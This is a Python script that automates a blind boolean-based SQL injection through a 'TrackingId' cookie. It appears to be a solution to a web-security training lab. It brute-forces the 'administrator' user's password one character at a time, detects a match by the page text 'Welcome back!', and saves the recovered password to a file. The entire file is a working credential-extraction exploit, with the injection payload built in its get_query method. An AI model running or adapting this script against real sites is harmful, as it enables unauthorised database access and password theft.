import requests
class PassFinder:
    array = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
         'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
         'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
         '4', '5', '6', '7', '8', '9']

    def __init__(self, url):
        self.url = url
        self.cookie = ""
        self.query = ""
        self.password = []
        self.passwordLength = 20


    def set_cookie(self, input):
        self.cookie = input


    def get_cookie(self):
        return "TrackingId=asd"


    def get_query(self, number, char):
        asd = f"'%20OR%20(SELECT%20SUBSTRING(password%2c{number}%2c1)%20FROM%20users%20WHERE%20username%3d'administrator')%3d'{char}'--"
        return asd


    def set_url(self, url):
        self.url = url


    def convertToCharArr(self, array):
        resultArr = []
        for e in array:
            resultArr.append(e['character'])
        return resultArr


    def sendRequest(self, number, char):
        cookieValue = self.get_cookie()
        queryValue = self.get_query(number, char)
        requestCookie = cookieValue + queryValue
        headers = {
            "Cookie": requestCookie,
        }
        response = requests.get(self.url, headers=headers)
        return response.text


    def isExpectedResult(self, input, searchTerm):
        index = input.find(searchTerm)
        return index != -1


    def bubbleSortByPosition(self, inputArr):
        n = len(inputArr)
        for i in range(n):
            already_sorted = True
            for j in range(n - i - 1):
                if inputArr[j]['position'] > inputArr[j + 1]['position']:
                    inputArr[j], inputArr[j + 1] = inputArr[j + 1], inputArr[j]
                    already_sorted = False
            if already_sorted:
                break
        return inputArr


    def writeResultToTxt(self, inputArr):
        text_file = open("password.txt", "w")
        password = ''.join(inputArr)
        text_file.write(password)
        text_file.close()


    def findPass(self):
        for char in self.array:
            for number in range(21):
                if (number == 0):
                    continue
                self.handleRequest(number, char)
        self.password = self.bubbleSortByPosition(self.password)
        passwordArray = self.convertToCharArr(self.password)
        self.writeResultToTxt(passwordArray)
            
    
    def handleRequest(self, number, char):
        if (len(self.password) == 20): return
        res = self.sendRequest(str(number), char)
        if self.isExpectedResult(res, "Welcome back!"):
            print({number, char})
            json_obj = {
                "position": number,
                "character": char
            }
            self.password.append(json_obj)
            asd = self.bubbleSortByPosition(self.password)
            print(asd)

        

    